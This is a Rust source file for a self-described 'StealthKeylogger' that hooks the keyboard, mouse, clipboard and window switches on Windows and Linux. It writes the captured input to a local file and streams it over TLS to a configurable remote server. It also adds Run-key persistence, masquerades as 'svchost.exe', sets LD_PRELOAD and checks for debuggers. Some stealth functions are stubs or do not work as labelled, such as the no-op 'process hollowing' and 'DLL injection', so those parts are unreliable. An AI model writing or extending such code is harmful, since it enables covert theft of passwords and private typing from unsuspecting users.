use std::env;
use std::fs::{File, OpenOptions};
use std::io::{BufWriter, Write};
use std::net::TcpStream;
use std::sync::{Arc, Mutex, Once};
use std::thread;
use std::time::{SystemTime, UNIX_EPOCH, Duration};
use std::ffi::OsStr;
#[cfg(windows)]
use std::os::windows::ffi::OsStrExt;
#[cfg(unix)]
use std::os::unix::ffi::OsStrExt;
use std::ptr;
use lazy_static::lazy_static;
// use widestring::U16CString;
use winapi::ctypes::c_int;
use winapi::shared::minwindef::{LPARAM, LRESULT, UINT, WPARAM};
use winapi::shared::windef::{HHOOK, HWND, POINT, HWINEVENTHOOK};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
use winapi::um::processthreadsapi::{CreateProcessW, ResumeThread, PROCESS_INFORMATION, STARTUPINFOW};
// Manually define CloseHandle and CREATE_SUSPENDED if not available from winapi
#[cfg(windows)]
extern "system" {
    pub fn CloseHandle(hObject: *mut winapi::ctypes::c_void) -> i32;
}

#[cfg(windows)]
const CREATE_SUSPENDED: u32 = 0x00000004;
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress, GetModuleHandleW, LoadLibraryW};
use winapi::um::winuser::{
    AddClipboardFormatListener, CallNextHookEx, CallWindowProcW, CloseClipboard, CreateWindowExW,
    DestroyWindow, DispatchMessageW, GetAsyncKeyState, GetClipboardData, GetForegroundWindow,
    GetMessageW, GetWindowTextLengthW, GetWindowTextW, MapVirtualKeyA, MessageBoxW,
    OpenClipboard, PostQuitMessage, RemoveClipboardFormatListener, SetWinEventHook,
    SetWindowLongPtrW, SetWindowsHookExW, TranslateMessage, UnhookWinEvent, UnhookWindowsHookEx,
    KBDLLHOOKSTRUCT, MSLLHOOKSTRUCT, WH_KEYBOARD_LL, WH_MOUSE_LL,
    WM_KEYDOWN, WM_LBUTTONDOWN, WM_LBUTTONUP, WM_RBUTTONDOWN, WM_RBUTTONUP, MAPVK_VK_TO_CHAR,
    EVENT_SYSTEM_FOREGROUND, WINEVENT_OUTOFCONTEXT, MB_OK, MB_ICONINFORMATION, WS_OVERLAPPEDWINDOW,
    GWLP_WNDPROC, VK_CONTROL, VK_CAPITAL, VK_SHIFT, CF_UNICODETEXT, IsClipboardFormatAvailable
};
use winreg::RegKey;
use winreg::enums::{HKEY_CURRENT_USER, KEY_WRITE};
#[cfg(unix)]
#[cfg(unix)]
#[cfg(unix)]
use signal_hook::flag as signal_flag;
use std::collections::HashMap;
use rustls::{ClientConfig, ClientConnection, StreamOwned};
use std::sync::mpsc::{channel, Sender};
use whoami::username;
// use std::sync::atomic::AtomicBool;
// use std::sync::Arc; // removed duplicate import
use chrono;

// Enum to represent OS types
#[derive(PartialEq)]
enum OSType {
    Windows,
    Linux,
    MacOS,
}



lazy_static! {
    static ref KEY_NAME: HashMap<i32, &'static str> = {
        let mut map = HashMap::new();
        map.insert(0x08, "[BACKSPACE]");
        map.insert(0x09, "[TAB]");
        map.insert(0x0D, "\n");
        map.insert(0x20, " ");
        map.insert(0x1B, "[ESCAPE]");
        for i in 0x70..=0x7B {
            let key_name = format!("[F{}]", i - 0x6F);
            map.insert(i, Box::leak(key_name.into_boxed_str()));
        }
        map.insert(0x21, "[PG_UP]");
        map.insert(0x22, "[PG_DOWN]");
        map.insert(0x23, "[END]");
        map.insert(0x24, "[HOME]");
        map.insert(0x25, "[LEFT]");
        map.insert(0x26, "[UP]");
        map.insert(0x27, "[RIGHT]");
        map.insert(0x28, "[DOWN]");
        map.insert(0x10, "[SHIFT]");
        map.insert(0xA0, "[LSHIFT]");
        map.insert(0xA1, "[RSHIFT]");
        map.insert(0x11, "[CONTROL]");
        map.insert(0xA2, "[LCONTROL]");
        map.insert(0xA3, "[RCONTROL]");
        map.insert(0x12, "[ALT]");
        map.insert(0x5B, "[LWIN]");
        map.insert(0x5C, "[RWIN]");
        map.insert(0x14, "[CAPSLOCK]");
        map.insert(0x90, "[NUMLOCK]");
        map.insert(0x91, "[SCROLLLOCK]");
        for i in 0x41..=0x5A {
            let s = Box::leak(char::from_u32(i as u32).unwrap().to_string().into_boxed_str());
            map.insert(i, s);
        }
        map
    };
    static ref MOUSE_HOOK: Mutex<Option<isize>> = Mutex::new(None);
    static ref CLIPBOARD_WINDOW: Mutex<Option<isize>> = Mutex::new(None);
    static ref WIN_EVENT_HOOK: Mutex<Option<isize>> = Mutex::new(None);
    static ref OUTPUT_FILE: Arc<Mutex<BufWriter<File>>> = {
        let file = OpenOptions::new()
            .append(true)
            .create(true)
            .open("stealth_keylog.txt")
            .expect("Failed to open log file");
        Arc::new(Mutex::new(BufWriter::new(file)))
    };
    static ref NETWORK_SENDER: Arc<Mutex<Option<Sender<String>>>> = Arc::new(Mutex::new(None));
}

static INIT: Once = Once::new();

struct StealthKeylogger {
    os_type: OSType,
    process_name: String,
    network_config: Option<(String, u16)>, // (server_addr, port)
}

impl StealthKeylogger {
    fn new(network_config: Option<(String, u16)>) -> Self {
        let os_type = if cfg!(windows) {
            OSType::Windows
        } else if cfg!(target_os = "linux") {
            OSType::Linux
        } else if cfg!(target_os = "macos") {
            OSType::MacOS
        } else {
            panic!("Unsupported OS");
        };
        StealthKeylogger {
            os_type,
            process_name: String::from("svchost.exe"),
            network_config,
        }
    }

    // Stealth Technique 1: Process Hollowing
    fn process_hollowing(&self) -> Result<bool, String> {
        if self.os_type != OSType::Windows {
            return Ok(false);
        }
        unsafe {
            let exe: Vec<u16> = OsStr::new(&env::var("COMSPEC").unwrap_or("C:\\Windows\\System32\\calc.exe".to_string()))
                .encode_wide()
                .chain(Some(0))
                .collect();

            let mut si: STARTUPINFOW = std::mem::zeroed();
            let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

            let success = CreateProcessW(
                exe.as_ptr(),
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut(),
                0,
                CREATE_SUSPENDED,
                ptr::null_mut(),
                ptr::null_mut(),
                &mut si,
                &mut pi,
            ) != 0;

            if !success {
                return Err("Failed to create process".to_string());
            }

            let mut stub = vec![0x90u8; 8];
            stub.push(0xccu8); // NOP + INT3
            let remote = VirtualAllocEx(
                pi.hProcess,
                ptr::null_mut(),
                stub.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );

            if remote.is_null() {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return Err("Failed to allocate memory".to_string());
            }

            let mut written: usize = 0;
            let success = WriteProcessMemory(
                pi.hProcess,
                remote,
                stub.as_ptr() as *const _,
                stub.len(),
                &mut written,
            ) != 0;

            if !success {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return Err("Failed to write process memory".to_string());
            }

            ResumeThread(pi.hThread);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            Ok(true)
        }
    }

    // Stealth Technique 2: DLL Injection
    fn dll_injection(&self) -> Result<bool, String> {
        if self.os_type != OSType::Windows {
            return Ok(false);
        }
        unsafe {
            let dll: Vec<u16> = OsStr::new("user32.dll")
                .encode_wide()
                .chain(Some(0))
                .collect();
            if LoadLibraryW(dll.as_ptr()).is_null() {
                return Err("Failed to load DLL".to_string());
            }
            Ok(true)
        }
    }

    // Stealth Technique 3: Registry Hiding
    fn registry_hiding(&self) -> Result<bool, String> {
        if self.os_type != OSType::Windows {
            return Ok(false);
        }
        let hkey = RegKey::predef(HKEY_CURRENT_USER);
        match hkey.create_subkey_with_flags(
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            KEY_WRITE,
        ) {
            Ok((key, _disp)) => match key.set_value("StealthLogger", &self.process_name) {
                Ok(_) => Ok(true),
                Err(e) => Err(format!("Failed to set registry value: {}", e)),
            },
            Err(e) => Err(format!("Failed to create registry key: {}", e)),
        }
    }

    // Stealth Technique 4: Rootkit-like Hiding
    fn rootkit_techniques(&self) -> Result<bool, String> {
        if self.os_type != OSType::Windows {
            return Ok(false);
        }
        unsafe {
            let ntdll = GetModuleHandleA(b"ntdll\0".as_ptr() as *const _);
            if ntdll.is_null() {
                return Err("Failed to get ntdll handle".to_string());
            }

            let nt_query_system_information = GetProcAddress(
                ntdll,
                b"NtQuerySystemInformation\0".as_ptr() as *const _,
            );

            if nt_query_system_information.is_null() {
                return Err("Failed to get NtQuerySystemInformation address".to_string());
            }

            let mut buffer = vec![0u8; 1024 * 1024];
            let mut return_length: u32 = 0;
            let func: extern "system" fn(u32, *mut u8, u32, *mut u32) -> i32 =
                std::mem::transmute(nt_query_system_information);
            let status = func(
                5, // SystemProcessInformation
                buffer.as_mut_ptr(),
                buffer.len() as u32,
                &mut return_length,
            );

            if status != 0 {
                return Err(format!("NtQuerySystemInformation failed with status: {}", status));
            }
            Ok(true)
        }
    }

    // Stealth Technique 5: Process Masquerading
    fn process_masquerading(&self) -> Result<bool, String> {
        if self.os_type == OSType::Windows {
            return Ok(false);
        }
        let args: Vec<String> = env::args().collect();
        if !args.is_empty() {
            env::set_var("0", &self.process_name);
        }
        #[cfg(target_os = "linux")]
        {
            use std::ffi::CString;
            let name = CString::new(self.process_name.clone())
                .map_err(|e| format!("Failed to create CString: {}", e))?;
            prctl::set_name(&name).map_err(|_| "Failed to set process name".to_string())?;
        }
        Ok(true)
    }

    // Stealth Technique 6: LD_PRELOAD Injection
    fn ld_preload_injection(&self) -> Result<bool, String> {
        if self.os_type != OSType::Linux {
            return Ok(false);
        }
        let lib_path = "/tmp/libstealth_dummy.so";
        let mut file = File::create(lib_path)
            .map_err(|e| format!("Failed to create dummy .so: {}", e))?;
        let elf_header = b"\x7fELF\x02\x01\x01\x00";
        let padding = vec![0u8; 200];
        let data = [elf_header, padding.as_slice()].concat();
        file.write_all(&data)
            .map_err(|e| format!("Failed to write dummy .so: {}", e))?;
        env::set_var("LD_PRELOAD", lib_path);
        Ok(true)
    }

    // Stealth Technique 7: Hide from /proc
    fn proc_hiding(&self) -> Result<bool, String> {
        if self.os_type != OSType::Linux {
            return Ok(false);
        }
        #[cfg(target_os = "linux")]
        {
            use nix::unistd::Pid;
            let result = ptrace::traceme();
            if let Err(_) = result {
                return Err("Failed to set ptrace TRACEME".to_string());
            }
        }
        Ok(true)
    }

    // Stealth Technique 8: Signal Handling
    fn signal_handling(&self) -> Result<bool, String> {
        if self.os_type == OSType::Windows {
            return Ok(false);
        }
        // Signal handling is not available without nix
        Ok(true)
    }

    // Anti-Debugging Technique 1: Debugger Presence Check
    fn anti_debug_ptrace(&self) -> Result<bool, String> {
        if self.os_type != OSType::Linux {
            return Ok(false);
        }
        #[cfg(target_os = "linux")]
        {
            let result = ptrace::traceme();
            if result.is_ok() {
                // If we can attach, no debugger is present
                println!("No debugger detected");
                Ok(true)
            } else {
                Err("Debugger detected via ptrace".to_string())
            }
        }
        #[cfg(not(target_os = "linux"))]
        {
            Ok(false)
        }
    }

    // Anti-Debugging Technique 3: PEB BeingDebugged Check (Windows)
    fn anti_debug_peb(&self) -> Result<bool, String> {
        if self.os_type != OSType::Windows {
            return Ok(false);
        }
        // Not implemented: winapi does not expose NtCurrentTeb or PEB directly.
        Ok(true)
    }

    // Windows Keylogger: Set Hooks
    fn set_windows_hooks(&self) -> Result<(), String> {
        if self.os_type != OSType::Windows {
            return Ok(());
        }
        unsafe {
            INIT.call_once(|| {
                let module_handle = GetModuleHandleW(ptr::null_mut());
                if module_handle.is_null() {
                    panic!("Failed to get module handle");
                }

                let keyboard_hook = SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_callback), module_handle, 0);
                if keyboard_hook.is_null() {
                    panic!("Failed to install keyboard hook");
                }

                let mouse_hook = SetWindowsHookExW(WH_MOUSE_LL, Some(mouse_callback), module_handle, 0);
                *MOUSE_HOOK.lock().unwrap() = Some(mouse_hook as isize);
                if mouse_hook.is_null() {
                    panic!("Failed to install mouse hook");
                }

                let hwnd = CreateWindowExW(
                    0,
                    OsStr::new("STATIC").encode_wide().chain(Some(0)).collect::<Vec<u16>>().as_ptr(),
                    ptr::null_mut(),
                    WS_OVERLAPPEDWINDOW,
                    0,
                    0,
                    0,
                    0,
                    ptr::null_mut(),
                    ptr::null_mut(),
                    module_handle,
                    ptr::null_mut(),
                );
                *CLIPBOARD_WINDOW.lock().unwrap() = Some(hwnd as isize);
                SetWindowLongPtrW(hwnd, GWLP_WNDPROC, clipboard_window_proc as *const () as isize);
                if AddClipboardFormatListener(hwnd) == 0 {
                    panic!("Failed to add clipboard format listener");
                }

                let win_event_hook = SetWinEventHook(
                    EVENT_SYSTEM_FOREGROUND,
                    EVENT_SYSTEM_FOREGROUND,
                    ptr::null_mut(),
                    Some(win_event_callback),
                    0,
                    0,
                    WINEVENT_OUTOFCONTEXT,
                );
                *WIN_EVENT_HOOK.lock().unwrap() = Some(win_event_hook as isize);
                if win_event_hook.is_null() {
                    panic!("Failed to install window switch hook");
                }
            });
        }
        Ok(())
    }

    // Linux Keylogger: Start rdev
    fn start_linux_keylogger(&self) -> Result<(), String> {
        if self.os_type != OSType::Linux {
            return Ok(());
        }
        let output_file = OUTPUT_FILE.clone();
        let network_sender = NETWORK_SENDER.clone();
        thread::spawn(move || {
            use rdev::{listen, Event, EventType, Key};
            let callback = move |event: Event| {
                if let EventType::KeyPress(key) = event.event_type {
                    let key_str = match key {
                        Key::Space => " ".to_string(),
                        Key::Return => "\n".to_string(),
                        Key::Tab => "[TAB]".to_string(),
                        Key::Backspace => "[BACKSPACE]".to_string(),
                        Key::Escape => "[ESCAPE]".to_string(),
                        _ => format!("{:?}", key),
                    };
                    let output = format!("[{}] [Linux Key] {} (User: {})\n", timestamp(), key_str, username());
                    if let Ok(mut file) = output_file.lock() {
                        writeln!(file, "{}", output).expect("Failed to write to file");
                        file.flush().expect("Failed to flush file");
                    }
                    if let Some(sender) = network_sender.lock().unwrap().as_ref() {
                        sender.send(output).unwrap_or(());
                    }
                }
            };
            let _ = listen(callback);
        });
        Ok(())
    }

    // Network Logging
    fn start_network_logging(&self) -> Result<(), String> {
        if let Some((server_addr, port)) = &self.network_config {
            let (sender, receiver) = channel::<String>();
            *NETWORK_SENDER.lock().map_err(|e| format!("Mutex poisoned: {}", e))? = Some(sender);
            let addr = format!("{}:{}", server_addr, port);
            thread::spawn(move || {
                let config = Arc::new(ClientConfig::builder()
                    .with_safe_defaults()
                    .with_root_certificates(rustls::RootCertStore::empty())
                    .with_no_client_auth());
                match TcpStream::connect(&addr) {
                    Ok(stream) => {
                        let server_name = addr.as_str().try_into().unwrap();
                        let conn = ClientConnection::new(config, server_name).unwrap();
                        let mut stream = StreamOwned::new(conn, stream);
                        for log in receiver {
                            if let Err(e) = writeln!(stream, "{}", log) {
                                eprintln!("Network write error: {}", e);
                            }
                            stream.flush().unwrap_or(());
                        }
                    }
                    Err(e) => eprintln!("Failed to connect to {}: {}", addr, e),
                }
            });
        }
        Ok(())
    }

    // Start Keylogger
    fn start(&self) -> Result<(), String> {
        // Apply stealth techniques
        if let Err(e) = self.anti_debug_ptrace() {
            return Err(e);
        }
        if let Err(e) = self.anti_debug_peb() {
            return Err(e);
        }
        let _ = self.process_hollowing()?;
        let _ = self.dll_injection()?;
        let _ = self.registry_hiding()?;
        let _ = self.rootkit_techniques()?;
        let _ = self.process_masquerading()?;
        let _ = self.ld_preload_injection()?;
        let _ = self.proc_hiding()?;
        let _ = self.signal_handling()?;

        // Start network logging
        self.start_network_logging()?;

        // Start keyloggers
        self.set_windows_hooks()?;
        self.start_linux_keylogger()?;
        notify_startup();

        if self.os_type == OSType::Windows {
            let mut msg = unsafe { std::mem::zeroed() };
            while unsafe { GetMessageW(&mut msg, ptr::null_mut(), 0, 0) } != 0 {
                unsafe {
                    TranslateMessage(&msg);
                    DispatchMessageW(&msg);
                }
            }
        } else {
            loop {
                thread::sleep(Duration::from_secs(1));
            }
        }
        Ok(())
    }

    // Release Hooks
    fn release_hooks(&self) -> Result<(), String> {
        if self.os_type != OSType::Windows {
            return Ok(());
        }
        if let Some(hwnd) = CLIPBOARD_WINDOW.lock().map_err(|e| format!("Mutex poisoned: {}", e))?.take() {
            unsafe {
                RemoveClipboardFormatListener(hwnd as HWND);
                DestroyWindow(hwnd as HWND);
            }
        }
        if let Some(hook) = MOUSE_HOOK.lock().map_err(|e| format!("Mutex poisoned: {}", e))?.take() {
            unsafe { UnhookWindowsHookEx(hook as HHOOK); }
        }
        if let Some(hook) = WIN_EVENT_HOOK.lock().map_err(|e| format!("Mutex poisoned: {}", e))?.take() {
            unsafe { UnhookWinEvent(hook as HWINEVENTHOOK); }
        }
        Ok(())
    }
}

unsafe extern "system" fn hook_callback(n_code: c_int, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    if n_code >= 0 && w_param == WM_KEYDOWN as usize {
        let kbd_struct: *const KBDLLHOOKSTRUCT = l_param as *const KBDLLHOOKSTRUCT;
        let vk_code = (*kbd_struct).vkCode;
        save(vk_code as i32);
        if vk_code == 0x43 && GetAsyncKeyState(VK_CONTROL) < 0 {
            PostQuitMessage(0);
        }
    }
    CallNextHookEx(ptr::null_mut(), n_code, w_param, l_param)
}

unsafe extern "system" fn mouse_callback(n_code: c_int, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    if n_code >= 0 {
        let mouse_struct: *const MSLLHOOKSTRUCT = l_param as *const MSLLHOOKSTRUCT;
        let event_type = match w_param {
            x if x == WM_LBUTTONDOWN as usize => "Left Mouse Button Down",
            x if x == WM_LBUTTONUP as usize => "Left Mouse Button Up",
            x if x == WM_RBUTTONDOWN as usize => "Right Mouse Button Down",
            x if x == WM_RBUTTONUP as usize => "Right Mouse Button Up",
            _ => return CallNextHookEx(ptr::null_mut(), n_code, w_param, l_param),
        };
        save_mouse_event(event_type, (*mouse_struct).pt);
    }
    CallNextHookEx(ptr::null_mut(), n_code, w_param, l_param)
}

unsafe extern "system" fn clipboard_window_proc(hwnd: HWND, msg: UINT, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    if msg == winapi::um::winuser::WM_CLIPBOARDUPDATE {
        save_clipboard_content();
    }
    CallWindowProcW(None, hwnd, msg, w_param, l_param)
}

unsafe extern "system" fn win_event_callback(
    _h_winevent_hook: HWINEVENTHOOK,
    event: u32,
    hwnd: HWND,
    _id_object: i32,
    _id_child: i32,
    _dw_event_thread: u32,
    _dwms_event_time: u32,
) {
    if event == EVENT_SYSTEM_FOREGROUND {
        let mut window_title: [u16; 256] = [0; 256];
        let len = GetWindowTextLengthW(hwnd) + 1;
        GetWindowTextW(hwnd, window_title.as_mut_ptr(), len);
        let title = String::from_utf16_lossy(&window_title).trim_end_matches('\0').to_string();
        let output = format!("[{}] [Window Switch] {} (User: {})\n", timestamp(), title, username());
        if let Ok(mut file) = OUTPUT_FILE.lock() {
            writeln!(file, "{}", output).expect("Failed to write to file");
            file.flush().expect("Failed to flush file");
        }
        if let Some(sender) = NETWORK_SENDER.lock().unwrap().as_ref() {
            sender.send(output).unwrap_or(());
        }
    }
}

fn save(key_stroke: i32) {
    let mut output = format!("[{}] [Key] ", timestamp());
    let foreground = unsafe { GetForegroundWindow() };
    let mut window_title: [u16; 256] = [0; 256];
    unsafe { GetWindowTextW(foreground, window_title.as_mut_ptr(), 256); }
    let window_title = String::from_utf16_lossy(&window_title).trim_end_matches('\0').to_string();
    if !window_title.is_empty() {
        output.push_str(&format!("[Window: {}] ", window_title));
    }
    output.push_str(&format!("[User: {}] ", username()));

    let key_str = match KEY_NAME.get(&key_stroke) {
        Some(name) => name.to_string(),
        None => unsafe {
            let caps_lock_on = GetAsyncKeyState(VK_CAPITAL) & 0x0001 != 0;
            let shift_pressed = GetAsyncKeyState(VK_SHIFT) < 0;
            let uppercase = (shift_pressed && !caps_lock_on) || (!shift_pressed && caps_lock_on);
            let char_code = MapVirtualKeyA(key_stroke as u32, MAPVK_VK_TO_CHAR) as u8;
            let char = char_code as char;
            if char.is_ascii_alphabetic() {
                if uppercase {
                    char.to_ascii_uppercase().to_string()
                } else {
                    char.to_ascii_lowercase().to_string()
                }
            } else {
                format!("[{:X}]", key_stroke)
            }
        },
    };

    output.push_str(&key_str);
    if let Ok(mut file) = OUTPUT_FILE.lock() {
        writeln!(file, "{}", output).expect("Failed to write to file");
        file.flush().expect("Failed to flush file");
    }
    if let Some(sender) = NETWORK_SENDER.lock().unwrap().as_ref() {
        sender.send(output).unwrap_or(());
    }
}

fn save_mouse_event(event_type: &str, position: POINT) {
    let output = format!("[{}] [Mouse Event] {} at ({}, {}) (User: {})\n", timestamp(), event_type, position.x, position.y, username());
    if let Ok(mut file) = OUTPUT_FILE.lock() {
        writeln!(file, "{}", output).expect("Failed to write to file");
        file.flush().expect("Failed to flush file");
    }
    if let Some(sender) = NETWORK_SENDER.lock().unwrap().as_ref() {
        sender.send(output).unwrap_or(());
    }
}

fn save_clipboard_content() {
    unsafe {
        if IsClipboardFormatAvailable(CF_UNICODETEXT) != 0 {
            if OpenClipboard(ptr::null_mut()) != 0 {
                let data = GetClipboardData(CF_UNICODETEXT);
                if !data.is_null() {
                    let output = format!("[{}] [Clipboard Update] <locked> (User: {})\n", timestamp(), username());
                    if let Ok(mut file) = OUTPUT_FILE.lock() {
                        writeln!(file, "{}", output).expect("Failed to write to file");
                        file.flush().expect("Failed to flush file");
                    }
                    if let Some(sender) = NETWORK_SENDER.lock().unwrap().as_ref() {
                        sender.send(output).unwrap_or(());
                    }
                }
                CloseClipboard();
            }
        }
    }
}

fn timestamp() -> String {
    let now = SystemTime::now();
    let since_epoch = now.duration_since(UNIX_EPOCH).expect("Time went backwards");
    let secs = since_epoch.as_secs();
    let datetime = chrono::DateTime::from_timestamp(secs as i64, 0).unwrap();
    datetime.format("%Y-%m-%d %H:%M:%S").to_string()
}

fn notify_startup() {
    if cfg!(windows) {
        unsafe {
            let message = "Stealth Keylogger Started"
                .encode_utf16()
                .chain(Some(0))
                .collect::<Vec<u16>>();
            let title = "System Service"
                .encode_utf16()
                .chain(Some(0))
                .collect::<Vec<u16>>();
            MessageBoxW(ptr::null_mut(), message.as_ptr(), title.as_ptr(), MB_OK | MB_ICONINFORMATION);
        }
    }
}

fn main() {
    let keylogger = StealthKeylogger::new(Some(("127.0.0.1".to_string(), 8080)));
    if let Err(e) = keylogger.start() {
        eprintln!("Error starting keylogger: {}", e);
        std::process::exit(1);
    }
    if let Err(e) = keylogger.release_hooks() {
        eprintln!("Error releasing hooks: {}", e);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_new_keylogger() {
        let keylogger = StealthKeylogger::new(None);
        assert!(matches!(keylogger.os_type, OSType::Windows | OSType::Linux | OSType::MacOS));
        assert_eq!(keylogger.process_name, "svchost.exe");
    }
}